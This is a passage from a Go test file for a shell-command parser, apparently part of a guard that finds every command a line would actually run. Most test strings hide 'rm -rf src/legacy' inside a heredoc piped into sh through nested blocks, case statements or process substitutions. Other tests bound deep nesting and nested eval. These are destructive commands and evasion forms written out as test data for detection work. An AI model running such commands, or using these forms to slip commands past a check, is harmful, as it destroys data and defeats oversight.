		"( (cat <<'EOF') | sh; echo hi) | grep x\nrm -rf src/legacy\nEOF",
		"{ { cat <<'EOF'; } | sh; } | grep x\nrm -rf src/legacy\nEOF",
		"case a in a) case b in b) cat <<'EOF';; esac | sh;; esac | grep x\nrm -rf src/legacy\nEOF",
		"case x in x) (cat <<'EOF') | sh;; esac | grep x\nrm -rf src/legacy\nEOF",
		"(case x in x) cat <<'EOF';; esac) | sh\nrm -rf src/legacy\nEOF", // a pattern's ) closes no block
		"{ case x in x) cat <<'EOF';; esac; } | sh\nrm -rf src/legacy\nEOF",
		"! case x in x) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF", // past ! and time
		"time -p case x in x) cat <<'EOF';; esac | sh\nrm -rf src/legacy\nEOF",
		"cat <<'EOF' | { :; sh; }\nrm -rf src/legacy\nEOF", // piped into a block: every command in it reads
		"cat <<'EOF' | (true; sh)\nrm -rf src/legacy\nEOF",
		"cat <<'EOF' > >(sh)\nrm -rf src/legacy\nEOF", // written into a process substitution
		"cat <<'EOF' > >(:; sh)\nrm -rf src/legacy\nEOF",
		"(cat <<'EOF') > >(sh)\nrm -rf src/legacy\nEOF",
		"{ cat <<'EOF'; } >> >(sh)\nrm -rf src/legacy\nEOF",
		"case x in x) cat <<'EOF';; esac &> >(sh)\nrm -rf src/legacy\nEOF",
		"select x in a; do cat <<'EOF'; done | sh\nrm -rf src/legacy\nEOF",
		"if true; then cat <<'EOF'; fi |& sh\nrm -rf src/legacy\nEOF",
	} {
		if got := Split(Sh, line); !slices.Contains(got, "rm -rf src/legacy") {
			t.Errorf("Split(%q) = %q", line, got)
		}
	}
	for _, line := range []string{"(cat <<'EOF') > out.txt\nrm -rf x\nEOF", "{ cat <<'EOF'; } | grep x\nrm -rf x\nEOF", "cat <<'EOF' > >(grep x)\nrm -rf x\nEOF"} {
		if p := Parse(Sh, line); slices.Contains(p.Commands, "rm -rf x") || p.Incomplete {
			t.Errorf("Parse(%q) = %q, incomplete %v: data read as a script", line, p.Commands, p.Incomplete)
		}
	}
}

// Blocks nested n deep, each piped on, make n²/2 reader links: bounded, and
// the parse says so.
func TestNestedPipedBlocksAreBounded(t *testing.T) {
	n := 20000
	line := strings.Repeat("(", n) + "cat <<'EOF'" + strings.Repeat(") | sh", n) + "\nx\nEOF"
	done := make(chan Parsed)
	go func() { done <- Parse(Sh, line) }()
	select {
	case p := <-done:
		if !p.Incomplete {
			t.Fatal("past maxLinks, not marked incomplete")
		}
	case <-time.After(5 * time.Second):
		t.Fatal("20000 nested piped blocks took over 5s")
	}
}

// A heredoc read as data stays data: a word of the command that is only a
// heredoc's word or a file is not a shell.
func TestAHeredocsWordIsNotItsShell(t *testing.T) {
	for _, line := range []string{"cat << sh\nrm -rf x\nsh", "cat > sh <<EOF\nrm -rf x\nEOF"} {
		if got := Split(Sh, line); slices.Contains(got, "rm -rf x") {
			t.Errorf("Split(%q) = %q: data read as a script", line, got)
		}
	}
}

// eval $( eval $( … ) ) reads each substitution twice; the work is bounded
// across the whole line, not only by depth, and the parse says so.
func TestNestedEvalIsBounded(t *testing.T) {
	n := 30 // 2^30 parses unbounded
	p := Parse(Sh, strings.Repeat("eval $(", n)+"echo ok"+strings.Repeat(")", n))
	if !p.Incomplete {
		t.Fatal("past the parse budget, not marked incomplete")
	}
	if len(p.Commands) > 4*maxParses {
		t.Fatalf("%d commands from a 240-byte line", len(p.Commands))
	}
	if q := Parse(Sh, "eval $(ssh-agent -s)"); q.Incomplete {
		t.Fatal("ordinary eval marked incomplete")
	}
}

// Nesting past maxDepth is kept as text and said to be incomplete — not a
// crash, not unbounded work.
func TestDeepNestingIsIncomplete(t *testing.T) {
	line := "echo " + strings.Repeat("$(", 500) + "rm -rf x" + strings.Repeat(")", 500)
	p := Parse(Sh, line)
	if !p.Incomplete {
		t.Fatal("500 levels of $( ) were not marked incomplete")
	}
	if q := Parse(Sh, "echo $(echo $(ls))"); q.Incomplete {
		t.Fatal("ordinary nesting marked incomplete")
	}
}
